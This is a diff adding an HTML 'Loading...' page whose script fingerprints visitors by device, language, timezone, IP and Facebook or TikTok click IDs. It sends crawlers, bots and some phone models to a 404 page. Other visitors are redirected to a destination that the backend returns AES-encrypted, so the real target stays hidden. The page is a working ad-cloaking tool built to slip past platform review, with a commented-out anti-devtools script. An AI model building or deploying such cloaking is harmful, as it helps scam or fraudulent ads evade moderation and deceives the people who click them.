@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Loading...</title>
+    <style>
+      /* basic styling for the loading screen */
+      #loading {
+        position: fixed;
+        width: 100%;
+        height: 100%;
+        top: 0;
+        left: 0;
+        background: rgba(255, 255, 255, 0.8);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 1000;
+      }
+      .spinner {
+        width: 50px;
+        height: 50px;
+        border: 6px solid #ccc;
+        border-top-color: #333;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      #loadingText {
+        font-size: 24px;
+        color: #333;
+        margin-top: 10px;
+      }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mobile-detect/1.4.5/mobile-detect.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@2.0.0-beta.2/dist/ua-parser.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <!--<script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool@latest/disable-devtool.min.js'></script> -->
+  </head>
+  <body>
+    <div id="loading">
+      <div class="spinner"></div>
+      <div id="loadingText">Loading...</div>
+    </div>
+    <div>
+      <p id="vpn"></p>
+    </div>
+    <script>
+      document.addEventListener("DOMContentLoaded", async () => {
+        // 防循环机制：检查是否已经处理过
+        if (sessionStorage.getItem("requestProcessed") === "true") {
+          console.log("请求已处理，避免重复执行");
+          return;
+        }
+
+        // 设置处理标记
+        // sessionStorage.setItem("requestProcessed", "true");
+
+        const parser = new UAParser();
+        const resultPar = parser.getResult();
+        let isSamsung = "";
+        // 记录开始时间
+        const startTime = performance.now();
+        // 创建 MobileDetect 实例
+        const md = new MobileDetect(window.navigator.userAgent);
+        const urlParams = new URLSearchParams(window.location.search);
+        const referer = urlParams.get("source");
+        const hasQueryParams = urlParams.toString() !== "";
+
+        // 检测设备信息
+        const deviceType = md.mobile() ? "Mobile" : "PC";
+        const isMobile = md.mobile() !== null || md.tablet() !== null;
+        const isIOS = md.is("iOS")
+          ? "iOS"
+          : md.is("AndroidOS")
+          ? "Android"
+          : "Other";
+        const isHuawei = /HUAWEI|Honor/i.test(navigator.userAgent)
+          ? "Huawei"
+          : "Not Huawei";
+        const userAgent = navigator.userAgent;
+        const screenWidth = window.screen.width;
+        const screenHeight = window.screen.height;
+        const pixelRatio = window.devicePixelRatio;
+        //时区
+        const timezoneName = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const continent = timezoneName.split("/")[0];
+        //中文浏览器
+        const userLanguage = navigator.language || navigator.userLanguage;
+
+        // 获取设备型号
+        const modelSM = resultPar.device.model;
+        // 检查型号是否包含 "SM-G" 并提取数字部分
+        if (modelSM && modelSM.startsWith("SM-G")) {
+          const modelNumber = parseInt(modelSM.match(/\d+/)[0], 10); // 提取数字部分并转换为整数
+          // 判断是否低于 955
+          if (modelNumber < 960) {
+            console.log(`禁止访问：设备型号 ${modelSM} 低于 SM-G955U`);
+            isSamsung = "BannedSamsung";
+          } else {
+            console.log(`允许访问：设备型号 ${modelSM} 符合要求`);
+            isSamsung = "Samsung";
+          }
+        } else {
+          isSamsung = "Not Samsung";
+        }
+
+        // 检测是否来自社交平台（例如 Facebook）
+        let codefb = ""; // 保存来源信息
+        // 检查是否包含 fbclid 参数
+        // 先检查是否包含 utm_source=fb 和 fbclid 参数
+        if (urlParams.get("utm_source") === "fb" && urlParams.has("fbclid")) {
+          codefb = "Facebook广告访问的。";
+        }
+        // 检查是否只包含 fbclid 参数
+        else if (urlParams.has("fbclid")) {
+          codefb = "Facebook链接访问的。";
+        }
+        // 检查是否包含 utm_source=fb 参数（不带 fbclid）
+        else if (urlParams.get("utm_source") === "fb") {
+          codefb = "Facebook广告访问的。";
+        }
+        // 检查是否包含 ttclid 参数
+        else if (urlParams.has("ttclid")) {
+          codefb = "TikTok链接访问的。";
+        }
+        // 其他来源
+        else {
+          codefb = "不是Facebook或TikTok";
+        }
+        // 打印信息
+        console.log("设备类型:", deviceType);
+        console.log("操作系统:", isIOS);
+
+        async function processRequest() {
+          try {
+            // 第一步：快速基本检测（前端检测明显不符合条件的设备）
+            const quickCheckResult = quickFrontendCheck({
+              userAgent: userAgent,
+              isMobile: isMobile,
+              isIOSS: isIOS,
+              isHuawei: isHuawei,
+              isSamsung: isSamsung,
+              userLanguage: userLanguage,
+            });
+
+            // 第二步：先获取IP地址
+            const ipResponse = await fetch("get_ip_info.php");
+            if (!ipResponse.ok) {
+              throw new Error("获取IP地址失败: " + ipResponse.status);
+            }
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            if (!quickCheckResult.pass) {
+              console.log("快速前端检测不通过:", quickCheckResult.reason);
+
+              // 快速前端检测不通过，也发送记录接口（不阻塞后续流程）
+              sendQuickAccessRecord({
+                userAgent: userAgent,
+                isMobile: isMobile,
+                isIOSS: isIOS,
+                isHuawei: isHuawei,
+                isSamsung: isSamsung,
+                userLanguage: userLanguage,
+                deviceType: deviceType,
+                screenWidth: screenWidth,
+                screenHeight: screenHeight,
+                pixelRatio: pixelRatio,
+                continent: continent,
+                hasQueryParams: hasQueryParams,
+                codefb: codefb,
+                checkResult: "failed", // 标记检测结果
+                failReason: quickCheckResult.reason, // 记录失败原因
+                userIp: ip,
+              });
+
+              redirectToWhatsApp();
+              return;
+            }
+
+            // 验证IP地址有效性
+            if (!ip || ip === "pending" || ip.trim() === "") {
+              console.error("获取IP地址失败或无效:", ip);
+              redirectToWhatsApp();
+              return;
+            }
+
+            // 第三步：使用真实IP发送后端请求
+            const backendResponse = await fetch(
+              "http://127.0.0.1:3031/fbVpnStock/getShuntLink",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                  domainName: window.location.host + window.location.pathname,
+                  userIp: ip, // 使用真实IP
+                  userMobile: deviceType,
+                  paraPath: hasQueryParams,
+                  isIOSS: isIOS,
+                  fb: codefb,
+                  screenWidth: screenWidth,
+                  screenHeight: screenHeight,
+                  pixelRatio: window.devicePixelRatio,
+                  continent: continent,
+                  isMobile: isMobile,
+                  userLanguage: userLanguage,
+                  userAgent: userAgent,
+                }),
+              }
+            );
+
+            if (!backendResponse.ok) {
+              throw new Error("后端请求失败: " + backendResponse.status);
+            }
+
+            const data1 = await backendResponse.json();
+            const conditions = data1.data.dataSuccess;
+            const keyy = data1.data.key;
+            console.log(conditions);
+
+            if (conditions) {
+              var urlData = data1.data.link;
+              var originalData = decryptAes(urlData, keyy);
+              // 重定向到响应的链接
+              window.location.replace(originalData);
+            } else {
+              document.body.innerHTML = "";
+            }
+
+            // 记录处理时间
+            const endTime = performance.now();
+            console.log(`请求处理完成，耗时: ${endTime - startTime}ms`);
+          } catch (error) {
+            console.error("发生错误:", error);
+            redirectToWhatsApp();
+          }
+        }
+
+        // 异步发送快速访问记录（不阻塞主流程）
+        function sendQuickAccessRecord(params) {
+          // 使用 fetch 的 fire-and-forget 模式，不等待响应
+          fetch("http://127.0.0.1:3031/fbVpnStock/quickAccessRecord", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              domainName: window.location.host + window.location.pathname,
+              userAgent: params.userAgent,
+              isMobile: params.isMobile,
+              isIOSS: params.isIOSS,
+              isHuawei: params.isHuawei,
+              isSamsung: params.isSamsung,
+              userLanguage: params.userLanguage,
+              deviceType: params.deviceType,
+              screenWidth: params.screenWidth,
+              screenHeight: params.screenHeight,
+              pixelRatio: params.pixelRatio,
+              continent: params.continent,
+              hasQueryParams: params.hasQueryParams,
+              codefb: params.codefb,
+              timestamp: new Date().toISOString(),
+              // 添加一个唯一标识，避免重复记录
+              sessionId:
+                sessionStorage.getItem("sessionId") || generateSessionId(),
+              checkResult: params.checkResult,
+              failReason: params.failReason,
+              userIp: params.userIp || "pending",
+            }),
+          }).catch((error) => {
+            // 静默处理错误，不影响主流程
+            console.log("快速访问记录发送失败（不影响主流程）:", error);
+          });
+        }
+
+        // 生成会话ID
+        function generateSessionId() {
+          const sessionId =
+            "session_" +
+            Date.now() +
+            "_" +
+            Math.random().toString(36).substr(2, 9);
+          sessionStorage.setItem("sessionId", sessionId);
+          return sessionId;
+        }
+
+        // 统一的跳转函数
+        function redirectToWhatsApp() {
+          try {
+            // 清除处理标记，允许重新处理
+            // sessionStorage.removeItem("requestProcessed");
+            // 使用window.location.href避免可能的循环
+            window.location.replace("/404.html");
+          } catch (e) {
+            console.error("跳转失败:", e);
+            // 备用跳转方案
+            window.location.href = "/404.html";
+          }
+        }
+
+        // 开始处理请求
+        await processRequest();
+      });
+
+      // 快速前端检测函数（内置逻辑，不调用额外接口）
+      function quickFrontendCheck(params) {
+        const {
+          userAgent,
+          isMobile,
+          isIOSS,
+          isHuawei,
+          isSamsung,
+          userLanguage,
+        } = params;
+
+        // 快速检测明显不符合条件的设备
+        if (isHuawei === "Huawei") {
+          return { pass: false, reason: "华为设备" };
+        }
+
+        if (isSamsung === "BannedSamsung") {
+          return { pass: false, reason: "三星低端设备" };
+        }
+
+        // 检测爬虫
+        if (
+          userAgent.toLowerCase().includes("bot") ||
+          userAgent.toLowerCase().includes("crawler") ||
+          userAgent.toLowerCase().includes("spider")
+        ) {
+          return { pass: false, reason: "爬虫检测" };
+        }
+
+        // 检测中文浏览器
+        // if (userLanguage && userLanguage.includes("zh")) {
+        //   return { pass: false, reason: "中文浏览器" };
+        // }
+
+        // 检测移动设备（如果需要）
+        // if (!isMobile) {
+        //   return { pass: false, reason: "非移动设备" };
+        // }
+
+        // 检测iOS版本（简化版）
+        // if (userAgent.includes("iphone") || userAgent.includes("ipad")) {
+        //   const match = userAgent.match(/os (\d+)_(\d+)/);
+        //   if (match) {
+        //     const major = parseInt(match[1]);
+        //     const minor = parseInt(match[2]);
+        //     if (major < 16 || (major === 16 && minor <= 6)) {
+        //       return { pass: false, reason: "iOS版本过低" };
+        //     }
+        //   }
+        // }
+
+        // 基本检测通过
+        return {
+          pass: true,
+          reason: "快速前端检测通过",
+        };
+      }
+
+      function decryptAes(encryptedData, key) {
+        var bytes = CryptoJS.AES.decrypt(
+          encryptedData,
+          CryptoJS.enc.Base64.parse(key),
+          {
+            mode: CryptoJS.mode.ECB,
+            padding: CryptoJS.pad.Pkcs7,
+          }
+        );
+        var decryptedData = bytes.toString(CryptoJS.enc.Utf8);
+        return decryptedData;
+      }
+    </script>
+  </body>
+</html>
